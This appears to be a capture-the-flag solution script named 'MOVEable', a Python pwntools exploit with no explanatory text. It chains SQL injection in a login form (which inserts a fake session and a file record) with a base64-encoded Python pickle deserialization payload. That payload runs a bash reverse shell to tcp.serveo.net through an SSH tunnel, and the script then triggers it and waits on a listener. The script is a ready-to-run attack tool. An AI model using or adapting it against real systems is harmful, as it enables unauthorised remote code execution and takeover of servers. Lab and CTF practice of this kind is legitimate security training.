## MOVEable

```python
#!/usr/bin/env python3
from pwn import *
import base64
import pickle
import os
import subprocess
import requests

context.log_level = 'info'

URL = input("Enter the challenge URL: ").rstrip("/")

USER = input("Enter the username for session creation: ")
PASSWORD = input("Enter the password for session creation: ")
SESSION_ID = input("Enter the session ID (ex. 123): ")
PICKLE_PAYLOAD_NAME = input("Enter the filename for the pickle payload: ")

PORT = input("Enter the port number for tcp.serveo.net: ")

IP_PORT = f"tcp.serveo.net/{PORT}"

log.info(f"Target URL: {URL}")
log.info(f"Your reverse shell will connect to {IP_PORT}")

log.info(f"Setting up SSH tunnel to serveo.net on port {PORT}...")
subprocess.run(["ssh", "-R", f"{PORT}:localhost:{PORT}", "serveo.net"])

def doPickle(payload):
    class PickleRce(object):
        def __reduce__(self):
            return (os.system, (payload,))
    return base64.b64encode(pickle.dumps(PickleRce()))

def triggerPayload(filename):
    log.info("Triggering payload")

    endpoint = f"{URL}/download/{filename}/{SESSION_ID}"
    log.info(f"Endpoint: {endpoint}")
    
    response = requests.get(endpoint, verify=False, allow_redirects=False)
    return response.text

def DBRestore(string):
    string = string.replace("'", "\\'")
    string = string.replace("\n", "%0a")
    string = string.replace(" ", "/**/")
    return string

def sendRequest(description, data):
    log.info(f"{description}")
    data = f'username={data}&password={PASSWORD}'
    response = requests.post(f"{URL}/login", data=data, verify=False, allow_redirects=False)
    
    return response.text

session_payload = DBRestore(f"{USER}';\nINSERT INTO activesessions (sessionid, username) VALUES ('{SESSION_ID}', '{USER}');--")
sendRequest("Create session", session_payload)

encodedCommand = base64.b64encode(f'bash -i >& /dev/tcp/{IP_PORT} 0>&1'.encode('utf-8')).decode('utf-8')
Command = f'echo "{encodedCommand}" | base64 -d | bash '
picklePayload = doPickle(Command).decode('utf-8')

file_payload = DBRestore(f"{USER}';\nINSERT INTO files (filename, data, sessionid) VALUES ('{PICKLE_PAYLOAD_NAME}', '{picklePayload}', '{SESSION_ID}');--")
sendRequest("Create file", file_payload)

triggerPayload(PICKLE_PAYLOAD_NAME)

log.info(f"Setting up listener on tcp.serveo.net:{PORT}")
listener = listen(int(PORT))
listener.wait_for_connection()
log.success("Connection received! Starting interaction...")
listener.interactive()
```
